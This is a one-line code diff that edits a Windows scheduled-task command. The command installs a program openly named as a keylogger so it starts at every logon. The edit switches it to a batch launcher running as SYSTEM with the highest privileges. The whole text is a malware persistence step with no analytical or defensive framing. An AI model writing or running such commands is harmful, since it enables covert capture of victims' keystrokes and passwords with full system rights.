@@ -1,1 +1,1 @@
-schtasks /create /tn "KeyloggerService" /tr "C:\ProgramData\keylogger_werkend.pyw" /sc onlogon /ru System /f
+schtasks /create /tn "KeyloggerService" /tr "C:\ProgramData\start_keylogger.bat" /sc onlogon /ru "NT AUTHORITY\SYSTEM" /rl HIGHEST /f
